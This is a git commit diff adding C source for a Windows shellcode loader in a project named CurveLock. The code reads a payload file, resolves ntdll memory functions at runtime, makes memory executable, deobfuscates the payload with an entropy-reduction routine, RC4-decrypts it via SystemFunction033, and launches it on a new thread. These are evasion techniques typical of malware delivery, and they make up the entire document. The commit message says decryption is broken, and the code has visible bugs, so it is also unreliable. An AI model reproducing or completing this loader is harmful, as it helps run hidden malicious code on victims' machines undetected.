9c9f1c5f7c732f8064afd5091047b4a8ae2fb28d
Swayam <swayamtejasp@gmail.com>
2025-01-08 08:53:24 -0800

    working but something wrong with decryption

--- CurveLock/CurveLock.c
+++ CurveLock/CurveLock.c
@@ -3,8 +3,129 @@
 #include "EntropyReducer.h"
 
 // Function to report WinApi Errors
-BOOL ReportError(const char* ApiName) {
-	printf("[!] \"%s\" [ FAILED ] \t%d \n", ApiName, GetLastError());
+BOOL ReportError(const char* WinApiName) {
+	printf("[!] \"%s\" [ FAILED ] \t%d \n", WinApiName, GetLastError());
 	return FALSE;
 }
+
+// Function to Decrypt the RC4 encrypted Payload
+BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	NTSTATUS	STATUS = NULL;
+
+	// Defining the key as a USTRING structure
+	USTRING		Key = {
+			.Buffer = pRc4Key,
+			.Length = dwRc4KeySize,
+			.MaximumLength = dwRc4KeySize
+	};
+
+	// Defining the Encrypted Data as a USTRING Structure
+	USTRING 	Data = {
+			.Buffer = pPayloadData,
+			.Length = sPayloadSize,
+			.MaximumLength = sPayloadSize
+	};
+
+	// Exporting SystemFunction033 from the Advapi32.dll
+	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");
+
+	// Calling the SystemFunction033
+	if ((STATUS = SystemFunction033(&Data, &Key)) != 0x0) {
+		printf("[!] SystemFunction033 FAILED With Error: 0x%0.8X \n", STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+int main(int argc, char* argv[]) {
+
+	if (!(argc >= 2)) {
+		printf("[!] Please Specify A Input File To Read ... \n");
+		return -1;
+	}
+	DWORD dwOldProtection = 0x00;
+	PVOID pExecAddress = NULL;
+	HANDLE hThread = NULL;
+	PVOID pAddress = NULL;
+
+	SIZE_T	RawPayloadSize = NULL;
+	PBYTE	RawPayloadBuffer = NULL;
+
+	// Read the Payload
+	printf("[i] Reading \"%s\" ... ", argv[1]);
+	if (!ReadPayloadFile(argv[1], &RawPayloadBuffer, &RawPayloadSize)) {
+		return -1;
+	}
+	printf("[+] DONE \n");
+	printf("\t>>> Raw Payload Size : %ld \n\t>>> Read Payload Located At : 0x%p \n", RawPayloadSize, RawPayloadBuffer);
+
+	SIZE_T sPayload = RawPayloadSize,
+		   sObfSize = RawPayloadSize;
+
+	unsigned char _key[0x10] = { 0 };
+
+	// Load NTAllocateVirtualMemory
+	pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+	
+	// Allocate Memory
+	NtAllocateVirtualMemory((HANDLE)-1, &pExecAddress, 0, &sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	printf("[+} Alloacted : %p\n", pExecAddress);
+
+	// Load and use NtProtectVirtualMemory
+	NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+	NtProtectVirtualMemory((HANDLE)-1, &pExecAddress, &sPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
+
+	// Load and use NtWriteVirtualMemory
+	NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
+	NtWriteVirtualMemory((HANDLE)-1, pExecAddress, &RawPayloadBuffer, sPayload, NULL);
+
+	printf("[+] Payload Written to : %p\n", pExecAddress);
+
+	// Deobfuscate the Payload
+	SIZE_T	DeobfuscatedPayloadSize = NULL;
+	PBYTE	DeobfuscatedPayloadBuffer = NULL;
+
+	printf("[i] Deobfuscating");
+	if (!Deobfuscate((PBYTE)pExecAddress, sObfSize, &(PBYTE)pExecAddress, &DeobfuscatedPayloadSize)) {
+		return -1;
+	}
+
+	printf("[+] DONE \n");
+	printf("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, pExecAddress);
+
+	// Extracting the Key from the payload and updating the pointer to be after the key
+	memcpy(_key, pExecAddress, 0x10); //copy the first 16 bytes to _key
+	pExecAddress = (PVOID)((ULONG_PTR)pExecAddress + 0x10); //update pointer to be after the first 16
+	printf("[+] Pointer Updated\n");
+
+	printf("[i] Decrypting with \n", pExecAddress);
+	printf("[i] Retrieved Key: [ ");
+	for (size_t i = 0; i < sizeof(_key); i++)
+		printf("%02X ", _key[i]);
+	printf("]\n");
+
+	DWORD	dwResourceDataSize = DeobfuscatedPayloadSize - 0x10;
+
+	//Decrypt the payload
+	Rc4EncryptionViSystemFunc033(_key, (PBYTE)pExecAddress, sizeof(_key), dwResourceDataSize);
+
+	printf("[+] Payload Decrypted at : %p\n", pExecAddress);
+	printf("[$] Press <Enter> To Run ... ");
+	getchar();
+
+	// Create Thread to run the Payload
+	hThread = CreateThread(NULL, NULL, pExecAddress, (PVOID)"pew pew", NULL, NULL);
+	if (!hThread)
+		return ReportError("CreateThread");
+
+	// Run the Payload
+	WaitForSingleObject(hThread, INFINITE);
+
+	printf("[+] DONE \n");
+
+	return 0;
+}
+
 
--- CurveLock/EntropyReducer.c
+++ CurveLock/EntropyReducer.c
@@ -81,6 +81,52 @@ BOOL InitializePayloadList(IN PBYTE pPayload, IN OUT PSIZE_T sPayloadSize, OUT P
     return TRUE;
 }
 
+// Function To Read the Payload File
+BOOL ReadPayloadFile(IN PCSTR cFileInput, OUT PBYTE* pPayloadData, OUT PSIZE_T sPayloadSize) {
+
+	// Local Variable definitions
+	HANDLE	hFile = INVALID_HANDLE_VALUE;
+	DWORD	dwFileSize = NULL;
+	DWORD	dwNumberOfBytesRead = NULL;
+	PBYTE	pBuffer = NULL;
+
+	// Open the file
+	hFile = CreateFileA(cFileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		return ReportError("CreateFileA");
+	}
+
+	// Get the size of the file
+	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
+		return ReportError("GetFileSize");
+	}
+
+	// Allocate memory for the file
+	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
+	if (!pBuffer)
+		return ReportError("HeapAlloc");
+
+	// Read the file
+	if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL)) {
+		printf("[i] Read %ld from %ld Bytes \n", dwNumberOfBytesRead, dwFileSize);
+		return ReportError("ReadFile");
+	}
+
+	// Set the Payload Data and Size
+	*pPayloadData = pBuffer;
+	*sPayloadSize = dwNumberOfBytesRead;
+
+	// Close the file
+	CloseHandle(hFile);
+
+	// Return Failure if the Payload Data or size is NULL
+	if (*pPayloadData == NULL || *sPayloadSize == NULL) {
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
 //--------------------------------------------------------------------------------------------------------
 ///
 /// The MergeSort function is used to sort the linked list based on the ID or the buffer
